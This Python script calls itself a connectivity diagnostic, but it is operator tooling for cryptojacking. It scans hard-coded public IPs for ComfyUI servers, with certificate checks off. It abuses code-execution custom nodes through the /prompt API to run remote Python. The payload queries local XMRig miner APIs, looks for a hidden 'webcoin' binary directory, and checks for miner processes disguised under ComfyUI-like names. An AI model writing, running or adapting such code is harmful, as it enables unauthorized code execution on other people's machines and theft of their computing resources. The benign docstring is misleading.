"""Probe dashboard endpoints on deployed machines to diagnose connectivity."""
import json, urllib.request, ssl, sys, io

sys.stdout = io.TextIOWrapper(sys.stdout.buffer, encoding="utf-8", errors="replace", line_buffering=True)

ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE

TARGETS = ["183.6.93.120", "43.218.199.5", "194.6.247.91", "182.92.111.146"]


def probe(ip):
    print(f"\n{'='*60}")
    print(f"  {ip}")
    print(f"{'='*60}")

    base = None
    for scheme, port in [("http", 8188), ("http", 80), ("https", 443)]:
        try:
            url = f"{scheme}://{ip}:{port}/system_stats"
            req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0"})
            kw = {"timeout": 8}
            if scheme == "https":
                kw["context"] = ctx
            with urllib.request.urlopen(req, **kw) as r:
                data = json.loads(r.read())
                if "system" in data:
                    base = f"{scheme}://{ip}:{port}"
                    print(f"  ComfyUI: {base}")
                    break
        except Exception:
            pass

    if not base:
        print(f"  ComfyUI: UNREACHABLE")
        return

    endpoints = [
        "/api/enhanced/stats",
        "/api/enhanced/config",
        "/ws/enhanced",
    ]

    for ep in endpoints:
        url = f"{base}{ep}"
        try:
            req = urllib.request.Request(url, headers={
                "User-Agent": "Mozilla/5.0",
                "Accept": "application/json",
            })
            kw = {"timeout": 8}
            if base.startswith("https"):
                kw["context"] = ctx
            with urllib.request.urlopen(req, **kw) as r:
                body = r.read().decode(errors="replace")[:500]
                print(f"  {ep} -> {r.status}: {body[:300]}")
        except urllib.error.HTTPError as e:
            try:
                err = e.read().decode(errors="replace")[:200]
            except Exception:
                err = ""
            print(f"  {ep} -> HTTP {e.code}: {err[:200]}")
        except Exception as exc:
            print(f"  {ep} -> {str(exc)[:150]}")

    print(f"\n  Checking XMRig API (local on machine)...")
    for node_setup in [
        {
            "1": {"class_type": "IDENode", "inputs": {"pycode": CHECK_CODE, "language": "python"}},
            "2": {"class_type": "PreviewTextNode", "inputs": {"text": ["1", 0]}},
        },
        {
            "1": {"class_type": "SRL Eval", "inputs": {"parameters": "", "code": CHECK_CODE}},
            "2": {"class_type": "PreviewAny", "inputs": {"source": ["1", 0]}},
        },
    ]:
        prompt = {"prompt": node_setup, "extra_data": {"extra_pnginfo": {
            "workflow": {"nodes": [{"id": 1, "type": list(node_setup["1"].values())[0]},
                                   {"id": 2, "type": list(node_setup["2"].values())[0]}]}
        }}}
        body = json.dumps(prompt).encode()
        try:
            req = urllib.request.Request(
                f"{base}/prompt", data=body,
                headers={"Content-Type": "application/json"}, method="POST"
            )
            kw = {"timeout": 15}
            if base.startswith("https"):
                kw["context"] = ctx
            with urllib.request.urlopen(req, **kw) as r:
                resp = json.loads(r.read())
                if "error" in resp:
                    continue
                pid = resp.get("prompt_id")
                import time
                time.sleep(10)
                try:
                    req2 = urllib.request.Request(f"{base}/history/{pid}")
                    kw2 = {"timeout": 10}
                    if base.startswith("https"):
                        kw2["context"] = ctx
                    with urllib.request.urlopen(req2, **kw2) as r2:
                        entry = json.loads(r2.read()).get(pid, {})
                        outputs = entry.get("outputs", {})
                        texts = []
                        for nid, nout in outputs.items():
                            for key, val in nout.items():
                                if isinstance(val, list):
                                    texts.extend(str(v) for v in val)
                                elif isinstance(val, str):
                                    texts.append(val)
                        result = "\n".join(texts) if texts else json.dumps(outputs)
                        print(f"  Remote check: {result[:400]}")
                        return
                except Exception:
                    pass
        except Exception:
            continue

    print(f"  Remote check: could not execute code")


CHECK_CODE = (
    "import json, os, subprocess\n"
    "lines = []\n"
    "try:\n"
    "    import urllib.request as ur\n"
    "    req = ur.Request('http://127.0.0.1:44880/2/summary',\n"
    "        headers={'Authorization': 'Bearer ce_xm_2026', 'Accept': 'application/json'})\n"
    "    with ur.urlopen(req, timeout=5) as resp:\n"
    "        d = json.loads(resp.read())\n"
    "    hr = d.get('hashrate', {}).get('total', [])\n"
    "    lines.append('cpu_hr=' + str(hr))\n"
    "    lines.append('cpu=' + str(d.get('cpu', {}).get('brand', '?')))\n"
    "    lines.append('uptime=' + str(d.get('uptime', 0)))\n"
    "except Exception as e:\n"
    "    lines.append('cpu_api=' + str(e)[:80])\n"
    "try:\n"
    "    req = ur.Request('http://127.0.0.1:44882',\n"
    "        headers={'Accept': 'application/json'})\n"
    "    with ur.urlopen(req, timeout=5) as resp:\n"
    "        g = json.loads(resp.read())\n"
    "    algos = g.get('Algorithms', [{}])\n"
    "    if algos:\n"
    "        lines.append('gpu_hr=' + str(algos[0].get('Total_Performance', 0)))\n"
    "        lines.append('gpu_algo=' + str(algos[0].get('Algorithm', '')))\n"
    "except Exception as e:\n"
    "    lines.append('gpu_api=' + str(e)[:80])\n"
    "webcoin = None\n"
    "for c in ['/root/ComfyUI/custom_nodes/webcoin', '/mnt/my_disk/ComfyUI/custom_nodes/webcoin',\n"
    "          '/home/ubuntu/ComfyUI/custom_nodes/webcoin', '/workspace/ComfyUI/custom_nodes/webcoin',\n"
    "          '/app/ComfyUI/custom_nodes/webcoin', '/opt/ComfyUI/custom_nodes/webcoin']:\n"
    "    if os.path.isdir(c):\n"
    "        webcoin = c\n"
    "        break\n"
    "lines.append('webcoin=' + str(webcoin))\n"
    "if webcoin:\n"
    "    bd = os.path.join(webcoin, 'bin')\n"
    "    if os.path.isdir(bd):\n"
    "        lines.append('bin=' + str(os.listdir(bd)))\n"
    "    else:\n"
    "        lines.append('bin=MISSING')\n"
    "for n in ['comfyui_service', 'comfyui_render']:\n"
    "    try:\n"
    "        r = subprocess.run(['pgrep', '-f', n], capture_output=True, text=True, timeout=5)\n"
    "        if r.stdout.strip():\n"
    "            lines.append(n + '_pids=' + r.stdout.strip().replace(chr(10), ','))\n"
    "    except: pass\n"
    "result = chr(10).join(lines)\n"
)

targets = sys.argv[1:] if len(sys.argv) > 1 else TARGETS
for ip in targets:
    probe(ip)
print("\nDone.")
